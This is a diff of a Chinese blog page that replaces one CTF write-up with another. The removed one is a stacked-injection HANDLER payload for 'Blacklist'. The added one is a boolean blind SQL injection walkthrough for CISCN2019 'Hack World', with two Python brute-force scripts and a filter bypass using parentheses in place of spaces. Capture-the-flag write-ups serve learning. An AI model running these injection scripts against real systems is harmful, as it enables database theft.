@@ -9,7 +9,7 @@
     
     <title>
         
-            Blacklist |
+            (CISCN2019 华北赛区 Day2 Web1)Hack World |
         
         paixiaoxing&#39;s Blog
     </title>
@@ -137,7 +137,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">Blacklist</span>
+            <span class="title-hover-animation">(CISCN2019 华北赛区 Day2 Web1)Hack World</span>
         </div>
 
         
@@ -156,8 +156,8 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-01-30 10:20:50</span>
-        <span class="mobile">2022-01-30 10:20</span>
+        <span class="pc">2022-01-31 14:07:24</span>
+        <span class="mobile">2022-01-31 14:07</span>
     </span>
     
     
@@ -174,40 +174,40 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>[可以先看看之前强网杯的随便住]</p>
-<p>首先进入题目：</p>
-<p><img src="/2022/01/30/Blacklist/1.png" alt="1"></p>
-<p>看起来是sql注入先试试看看有啥报错</p>
-<p><img src="/2022/01/30/Blacklist/2.png" alt="1"></p>
-<p>看起来是单引号字符型漏洞</p>
-<p>测试一下他的列数</p>
-<p><img src="/2022/01/30/Blacklist/3.png" alt="1"></p>
-<p>4看起来不行</p>
-<p>测试了一下2的时候可以正常回显</p>
-<p><img src="/2022/01/30/Blacklist/4.png" alt="1"></p>
-<p>所以列数是2，用select看看有没有回显的地方</p>
-<p><img src="/2022/01/30/Blacklist/5.png" alt="1"></p>
-<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
-<p>但是没有过滤show所以考虑到堆叠注入</p>
-<p>看一看库</p>
-<p><img src="/2022/01/30/Blacklist/6.png" alt="1"></p>
-<p>表：</p>
-<p><img src="/2022/01/30/Blacklist/7.png" alt="1"></p>
-<p>再看看FlagHere的字段：</p>
-<p><img src="/2022/01/30/Blacklist/8.png" alt="1"></p>
-<p>还有words字段</p>
-<p><img src="/2022/01/30/Blacklist/9.png" alt="1"></p>
-<p>可以看到我们的回显就是再words表里面返回的</p>
-<p>就想到我们是不是可以更改表名让显示的表是flaghere这张表</p>
-<p>但是上面的rename还有alterupdate啥的都被过滤了</p>
-<p>被卡住了</p>
-<p>上网查了一下知道这样一个骚姿势：（参考网址：<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/12398554.html%EF%BC%89">https://www.cnblogs.com/gaonuoqi/p/12398554.html）<i class="fas fa-external-link-alt"></i></a></p>
-<p>handler函数</p>
-<p>handleropen可以打开这个表再close之前都可以改变，那我们就可以直接把flaghere这个表第一个读取</p>
-<p>就可以替换掉words</p>
-<p><img src="/2022/01/30/Blacklist/10.png" alt="1"></p>
-<p>payload=?inject=1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
-<p>得到flag</p>
+            <h1 id="今天来写一下Hack-World"><a href="#今天来写一下Hack-World" class="headerlink" title="今天来写一下Hack World"></a>今天来写一下Hack World</h1><p>首先还是先进入题目：</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/2.png" alt="1"></p>
+<p>提示我们我们想要的flag再表flag中的flag列中</p>
+<p>我们可以猜一下payload=select flag from flag</p>
+<p>先试试输入数字看看</p>
+<p>发现1是</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/1.png" alt="1"></p>
+<p>2是<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/3.png" alt="1"></p>
+<p>0和3就报错了</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/4.png" alt="1"></p>
+<p>输入数字看一下<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/5.png" alt="1"></p>
+<p>返回了一个布尔值</p>
+<p>那试试布尔盲注判断它是否返回了正常值</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/6.png" alt="1"></p>
+<p>发现可以正常返回确定了是布尔盲注</p>
+<p>写个脚本看看结果database是啥</p>
+<p>附python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>看到当前的表名字是ctftraining</p>
+<p>想到我们刚刚的select flag from flag</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/7.png" alt="1"></p>
+<p>会不会是空格被注释掉了，因为这些函数是可以使用的，尝试一下绕过这个空格</p>
+<p>怎么绕呢，看到前面括号可以正常执行</p>
+<p>试试括号绕过也就是select(flag)from(flag)</p>
+<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/8.png" alt="1"></p>
+<p>可以运行</p>
+<p>那就好办了因为前面说了</p>
+<p>flag就在这里面</p>
+<p>所以我们直接构造payload打</p>
+<p>附上payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就可以拿到flag拉</p>
 
         </div>
 
@@ -218,29 +218,14 @@
         
             <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">(CISCN2019 华北赛区 Day2 Web1)Hack World</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/"
+                           href="/2022/01/30/Blacklist/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">随便注</span>
+                                <span class="post-nav-title-item">Blacklist</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
